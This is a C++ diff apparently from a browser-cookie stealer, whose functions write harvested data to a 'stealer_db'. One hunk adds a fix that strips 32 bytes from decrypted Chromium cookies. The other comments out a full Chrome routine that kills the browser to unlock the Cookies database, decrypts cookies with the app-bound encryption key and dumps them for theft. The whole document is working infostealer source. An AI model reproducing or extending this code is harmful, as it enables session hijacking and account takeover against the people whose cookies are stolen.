@@ -201,6 +201,10 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 							if (decrypted_cookies.empty())
 								continue;
 
+							if (decrypted_cookies.size() > 32) {
+								decrypted_cookies.erase(0, 32);  // Remove the first 32 bytes
+							}
+
 							data.get_cookies_manager().setCookies(decrypted_cookies);
 							data.get_cookies_manager().setUrl(host_key);
 							data.get_cookies_manager().setCookieName(name);
@@ -376,102 +380,102 @@ BOOL chromium_history_collector(std::string username, std::string stealer_db)
 	return true;
 }
 
-BOOL chrome_cookie_collector_app_bound_decryption(std::string username, std::string stealer_db)
-{
-	//Target google chrome
-	std::string target_browser = "Google\\Chrome\\";
-
-	//Retrieve Chromium App Bound Encryption Key
-	std::string app_bound_key = retrieve_chrome_key();
-	//----------------------------------------------------------------------------------------------------------------------------------------
-	std::vector<DataHolder> data_list;
-
-	std::string target_user_data;
-	std::string target_cookie_data;
-	std::string target_key_data;
-	
-	target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + target_browser + "User Data";
-	target_cookie_data = target_user_data + "\\Default\\Network\\Cookies";
-	//target_key_data = target_user_data + "\\Local State";
-
-	try {
-		sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
-
-		if (stmt == nullptr)
-		{
-			// cookies file is locked when chromium based browser is running
-			if (!kill_process(target_browser))
-				return false;
-
-			stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
-			if (stmt == nullptr)
-			{
-				return false;
-			}
-		}
-
-		ChromiumDecryptor obj;
-		if (obj.ChromiumAppBoundDecryptorInit(app_bound_key))
-		{
-			while (sqlite3_step(stmt) == SQLITE_ROW)
-			{
-				DataHolder data;
-
-				char* host_key = (char*)sqlite3_column_text(stmt, 0);
-				char* name = (char*)sqlite3_column_text(stmt, 1);
-
-				std::vector<BYTE> cookies;
-				const void* encrypted_value = sqlite3_column_blob(stmt, 3);
-				int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
-				char* expiry = (char*)sqlite3_column_text(stmt, 4);
-
-				if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {
-					// Assign the BLOB data to the std::vector<BYTE>
-					cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);
-
-					if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
-						continue;
-
-					try
-					{
-						//decrypt cookies here
-						std::string decrypted_cookies = obj.AESDecrypterAppBound(cookies);
-
-						if (decrypted_cookies.empty())
-							continue;
-
-						data.get_cookies_manager().setCookies(decrypted_cookies);
-						data.get_cookies_manager().setUrl(host_key);
-						data.get_cookies_manager().setCookieName(name);
-						data.get_cookies_manager().setHost(target_browser);
-						data.get_cookies_manager().setCookiesExpiry(expiry);
-					}
-					catch (int e)
-					{
-						continue;
-					}
-
-					data_list.push_back(data);
-				}
-				else {
-					// Handle the case where the cookies_blob is null (no data)
-					continue;
-				}
-			}
-		}
-		else
-		{
-			return false;
-		}
-	}
-	catch (int e)
-	{
-		return false;
-	}
-
-	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
-		return false;
-
-	//std::cout << "stealer_db path: " << stealer_db << std::endl;
-	return true;
-}
+//BOOL chrome_cookie_collector_app_bound_decryption(std::string username, std::string stealer_db)
+//{
+//	//Target google chrome
+//	std::string target_browser = "Google\\Chrome\\";
+//
+//	//Retrieve Chromium App Bound Encryption Key
+//	std::string app_bound_key = retrieve_chrome_key();
+//	//----------------------------------------------------------------------------------------------------------------------------------------
+//	std::vector<DataHolder> data_list;
+//
+//	std::string target_user_data;
+//	std::string target_cookie_data;
+//	std::string target_key_data;
+//	
+//	target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + target_browser + "User Data";
+//	target_cookie_data = target_user_data + "\\Default\\Network\\Cookies";
+//	//target_key_data = target_user_data + "\\Local State";
+//
+//	try {
+//		sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
+//
+//		if (stmt == nullptr)
+//		{
+//			// cookies file is locked when chromium based browser is running
+//			if (!kill_process(target_browser))
+//				return false;
+//
+//			stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
+//			if (stmt == nullptr)
+//			{
+//				return false;
+//			}
+//		}
+//
+//		ChromiumDecryptor obj;
+//		if (obj.ChromiumAppBoundDecryptorInit(app_bound_key))
+//		{
+//			while (sqlite3_step(stmt) == SQLITE_ROW)
+//			{
+//				DataHolder data;
+//
+//				char* host_key = (char*)sqlite3_column_text(stmt, 0);
+//				char* name = (char*)sqlite3_column_text(stmt, 1);
+//
+//				std::vector<BYTE> cookies;
+//				const void* encrypted_value = sqlite3_column_blob(stmt, 3);
+//				int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
+//				char* expiry = (char*)sqlite3_column_text(stmt, 4);
+//
+//				if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {
+//					// Assign the BLOB data to the std::vector<BYTE>
+//					cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);
+//
+//					if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
+//						continue;
+//
+//					try
+//					{
+//						//decrypt cookies here
+//						std::string decrypted_cookies = obj.AESDecrypterAppBound(cookies);
+//
+//						if (decrypted_cookies.empty())
+//							continue;
+//
+//						data.get_cookies_manager().setCookies(decrypted_cookies);
+//						data.get_cookies_manager().setUrl(host_key);
+//						data.get_cookies_manager().setCookieName(name);
+//						data.get_cookies_manager().setHost(target_browser);
+//						data.get_cookies_manager().setCookiesExpiry(expiry);
+//					}
+//					catch (int e)
+//					{
+//						continue;
+//					}
+//
+//					data_list.push_back(data);
+//				}
+//				else {
+//					// Handle the case where the cookies_blob is null (no data)
+//					continue;
+//				}
+//			}
+//		}
+//		else
+//		{
+//			return false;
+//		}
+//	}
+//	catch (int e)
+//	{
+//		return false;
+//	}
+//
+//	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
+//		return false;
+//
+//	//std::cout << "stealer_db path: " << stealer_db << std::endl;
+//	return true;
+//}
